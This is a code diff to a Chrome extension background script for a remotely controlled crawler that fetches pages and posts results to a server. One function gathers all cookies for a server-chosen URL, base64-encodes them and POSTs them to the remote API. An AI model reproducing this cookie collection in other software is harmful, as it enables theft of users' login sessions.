@@ -239,7 +239,25 @@ function pullActions() {
 	var timestamp = new Date().getTime();
 	if(timestamp - window.setInterval_getLinksCache_lastRunTime > window.spiderSlaveGetUrlsDelay) {
 		window.setInterval_getLinksCache_lastRunTime = timestamp;
-		sendMessageToTabs(window.spiderSlaveTabInfos['api'], { 'admintype': 1, 'url': window.spiderSlaveApiActionList, 'data': { 'sFlag': window.spiderSlaveFlag,'workCreateFlag':window.workCreateFlag } });
+		ajaxPost(window.spiderSlaveTabInfos['api'], { 'admintype': 1, 'url': window.spiderSlaveApiActionList, 'data': { 'sFlag': window.spiderSlaveFlag,'workCreateFlag':window.workCreateFlag } },function(data) {
+			if (!(data.data instanceof Array)) {
+				return;
+			}
+
+			data.data.forEach(function (v) {
+				if (!window.spiderSlaveUrls[v['id']] && !window.spiderSlaveDeletedUrls[v['id']]) {
+					window.spiderSlaveUrls[v['id']] = v;
+				}
+			});
+
+			//clean deleted urls,keep 20 min
+			var compareTime = new Date().getTime() - 1200000;
+			for(var id in window.spiderSlaveDeletedUrls) {
+				if(window.spiderSlaveDeletedUrls[id] < compareTime) {
+					delete window.spiderSlaveDeletedUrls[id];
+				}
+			}
+		});
 	}
 }
 
@@ -535,20 +553,11 @@ function getHml(tab, info) {
 		}
 		
 		if(info['isEnd'] === true) {
-			var maxLen = 2621440;
-			if(info['results'][0].length > maxLen) {
-				var totalLen = info['results'][0].length;
-				for(var i = 0;i <= totalLen;i = i+maxLen) {
-					sendMessageToTabs(window.spiderSlaveTabInfos['api'], { 'admintype': 4, 'tab': {id:tab.id}, 'url': window.spiderSlaveApiCb, 'data': { 'id': info['id'],'betch':i, 'sResponse': info['results'][0].slice(i,i+maxLen) } });
-				}
-				sendMessageToTabs(window.spiderSlaveTabInfos['api'], { 'admintype': 4, 'tab': {id:tab.id}, 'url': window.spiderSlaveApiCb, 'data': { 'id': info['id'],'sFlag': window.spiderSlaveFlag,'workCreateFlag':window.workCreateFlag} },function() {
-					isDone(tab, info);
-				});
-			}else{
-				sendMessageToTabs(window.spiderSlaveTabInfos['api'], { 'admintype': 2, 'tab': {id:tab.id}, 'url': window.spiderSlaveApiCb, 'data': { 'id': info['id'], 'sResponse': info['results'][0],'sFlag': window.spiderSlaveFlag,'workCreateFlag':window.workCreateFlag } },function() {
-					isDone(tab, info);
-				});
-			}
+			ajaxPost(window.spiderSlaveTabInfos['api'], { 'admintype': 2, 'tab': {id:tab.id}, 'url': window.spiderSlaveApiCb, 'data': { 'id': info['id'], 'sResponse': info['results'][0],'sFlag': window.spiderSlaveFlag,'workCreateFlag':window.workCreateFlag } },function() {
+				isDone(tab, info);
+			},function() {
+				isDone(tab, info, true);
+			});
 		}
 	}.bind(this));
 }
@@ -696,26 +705,6 @@ chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
 				window.tabUrlIds[tab.id] = undefined;
 			}
 			break;
-
-		//push url
-		case 2:
-			if (!(req.data.data instanceof Array)) {
-				break;
-			}
-			req.data.data.forEach(function (v) {
-				if (!window.spiderSlaveUrls[v['id']] && !window.spiderSlaveDeletedUrls[v['id']]) {
-					window.spiderSlaveUrls[v['id']] = v;
-				}
-			});
-
-			//clean deleted urls,keep 20 min
-			var compareTime = new Date().getTime() - 1200000;
-			for(var id in window.spiderSlaveDeletedUrls) {
-				if(window.spiderSlaveDeletedUrls[id] < compareTime) {
-					delete window.spiderSlaveDeletedUrls[id];
-				}
-			}
-			break;
 		default:
 			break;
 	}
@@ -745,11 +734,31 @@ function backgroundConsole(pre, obj) {
 function backgroundAction201(tab, info) {
 	chrome.cookies.getAll({'url':info.url},function(cookies) {
 		textToBase64(JSON.stringify(cookies),function(base64){
-			sendMessageToTabs(window.spiderSlaveTabInfos['api'], { 'admintype': 2, 'tab': tab, 'url': window.spiderSlaveApiCb, 'data': { 'id': info['id'], 'sResponse': base64 } });
-			isDone(tab, info);
+			ajaxPost(window.spiderSlaveTabInfos['api'], { 'admintype': 2, 'tab': tab, 'url': window.spiderSlaveApiCb, 'data': { 'id': info['id'], 'sResponse': base64 } },function() {
+				isDone(tab, info);
+			},function() {
+				isDone(tab, info,true);
+			});
 		});
 	});
+}
 
+function ajaxPost(tab,request,cb,errorcb) {
+	$.ajax({
+		type: 'POST',
+		url: request.url,
+		data: request.data,
+		success: function(data){
+			if(cb !== undefined) {
+				cb(data);
+			}
+		},
+		error: function (xhr, textStatus, errorThrown) {
+			if(errorcb !== undefined) {
+				errorcb();
+			}
+		}
+	});
 }
 
 function actionRecords(message, title) {
